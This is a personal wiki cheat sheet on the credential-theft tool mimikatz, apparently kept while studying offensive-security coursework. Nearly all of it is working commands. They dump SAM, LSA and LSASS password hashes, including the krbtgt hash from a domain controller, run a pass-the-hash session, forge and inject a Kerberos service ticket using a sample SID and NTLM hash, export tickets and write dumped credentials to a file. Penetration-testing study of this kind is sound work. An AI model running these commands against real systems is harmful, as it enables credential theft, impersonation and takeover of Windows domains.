Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-26T11:06:31-05:00

====== mimikatz ======
Created Tuesday 26 October 2021

===== Description =====
* Extracts NTLM hashes from [[Technologies:Windows:SAM]]
* ...

===== Website =====
https://github.com/gentilkiwi/mimikatz/wiki

===== Installation =====
* Kali: Installed here
{{{code: lang="texinfo" linenumbers="False"
/usr/share/windows-resources/mimikatz
}}}


===== Usage =====
* Mimikatz must be run from an administrator account or as SYSTEM.
* Mimikatz must be run in high integrity level. See, if from an admin account, the exe must be run as "Administator"

{{{code: lang="sh" linenumbers="False"
mimikatz.exe
privilege::debug   # Should say something like Privilege '20' OK. If not, you're underprivileged and need to escalate first
token::elevate	   # Since LSASS runs as SYSTEM, we need to elevate the security token to system (impersonated)

lsadump::sam						# Dumps LM/NTLM hashes
lsadump::lsa [/patch|/inject]		# Dumps more NTLN hashes. Also dumps krbtgt hash. /patch or /inject is required to bypass security control

sekurlsa::logonpasswords 											# Dumps hashes of passwords of logged on users  (admin required)
sekurlsa::pth /user:<user> /ntlm:<hash> /domain:<domain /run:<cmd>	# Run <cmd> as <user>@<domain> using Pass-the-Hash technique

kerberos::golden 													# Generates silver ticket and injects into memory	
				 /user:<user> 										# Username of the account the ticket should be generated for (can be fake)
				 /domain:<corp>										# Domain the user
				 /sid:<sid> 										# SID of the user account (whoami /user)
				 /target:<host>:[<port>] 							# The target location of the service  
				 /service:<name>									# The service name for the ticket
				 /rc4:<ntlm_hash>		 							# The NTLM hash of the service account
				 /ptt												# Persist ticket in memory
}}}


===== Examples =====
{{{code: lang="sh" linenumbers="False"
lsadump::sam						# Dumps LM/NTLM hashes
lsadump::lsa /patch					# Dumps more NTLN hashes. Also dumps krbtgt hash 
}}}

* Token must be elevated for this to work

{{{code: lang="texinfo" linenumbers="False"
sekurlsa::logonpasswords
}}}

* Dumps all passwords hashes of logged  in users using the skurlsa module

{{{code: lang="powershell" linenumbers="False"
sekurlsa::pth /user:jeff /ntlm:HAASH /domain:domain.com /run:powershell.exe
}}}

* Must be run as admin + high integrity
* Will run powershell as jeff@domain.com, but in a separate window.
* This command should be run in an RDP session, and not from a SHELL, because you won't have access to powershell.exe

{{{code: lang="texinfo" linenumbers="False"
sekurlsa::tickets
}}}

* Dumps user's tickets that are stored in memory

{{{code: lang="texinfo" linenumbers="False"
kerberos::list /export 					# Exports a list of tickets to files
kerberos::purge 					 	# Purges tickets from memory
}}}


==== Generate silver ticket ====
{{{code: lang="sh" linenumbers="False"
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
}}}


Dump hashes from DC
{{{code: lang="sh" linenumbers="False"
mimikatz "privilege::debug" "token::elevate" "lsadump::lsa /patch"
}}}


===== Dump hashes to file =====
{{{code: lang="sh" linenumbers="False"
log <filename>
lsadump::sam
}}}

* Open <filename> for logging of next command
* Dump hashes to file

Mimikatz from command line
{{{code: lang="sh" linenumbers="False"
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > <filename>
}}}


===== Remarks =====
* Running mimikatz may be tricky running from a shell as admin, because UAC needs to be bypassed
* From a SYSTEM account, this should not be a problem



===== Errors =====
{{{code: lang="texinfo" linenumbers="False"
sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
}}}

* This has to to with a microsoft patch for windows 10.x system. IF your version is 2.2, try 2.1



===== SEE =====
[[AttackVectors:Windows:Active Directory]]
[[Enumeration:Windows:Active Directory]]
[[Technologies:Windows:Active Directory]]

